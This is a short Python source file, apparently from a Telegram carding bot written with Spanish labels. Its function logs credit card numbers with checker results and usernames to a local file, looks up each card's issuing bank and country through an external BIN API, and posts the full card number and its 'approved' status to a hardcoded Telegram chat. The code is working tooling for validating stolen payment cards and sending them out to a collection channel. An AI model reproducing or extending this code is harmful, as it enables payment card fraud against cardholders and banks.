from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton,InlineKeyboardMarkup
import requests
from configs import config






def ct(CC, response, user, gate):
    file = open("cards.txt", "a", encoding="utf-8")
    listaContenido = [
        f"{CC} | ",
        f"{response} | ",
        f"{user} | ",
        f"{gate}\n"
   ]
    file.writelines(listaContenido)
    file.close()
    
    BIN = CC[:6]
    gateBIN = requests.get(f"https://bins-su-ani.vercel.app/api/{BIN}").json() #API .BIN
    bin = gateBIN["data"]["bin"]
    vendor = gateBIN["data"]["vendor"]
    type = gateBIN["data"]["type"]
    level = gateBIN["data"]["level"]
    bank = gateBIN["data"]["bank"]
    codeCountry = gateBIN["data"]["countryInfo"]["code"]
    country = gateBIN["data"]["countryInfo"]["name"]
    emojiCountry = gateBIN["data"]["countryInfo"]["emoji"]
    if bank == "":
        bank = "/"
    if type == "":
        type = "/"
    if vendor == "":
        vendor = "/"
    if level == "":
        level = "/"
    texto = (f"""
CC: {CC}
Response: {response} ✅
Gate: {gate}
------> Detalles bin <------
Bin: {bin}
Bin info: {vendor} - {type} - {level}
Banco: {bank}
Pais: {emojiCountry} {country} - {codeCountry}
------> Info <------
Chequeada por: @{user}
""")
    data = {'chat_id': -1001736957307, "text": texto}
    requests.post(f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage", data=data)
